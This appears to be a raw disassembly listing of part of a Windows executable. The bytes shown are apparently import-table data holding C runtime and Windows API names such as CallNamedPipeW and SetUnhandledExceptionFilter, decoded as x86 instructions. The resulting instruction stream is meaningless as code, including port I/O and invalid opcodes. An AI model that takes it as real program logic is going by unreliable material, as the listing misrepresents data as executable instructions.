  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
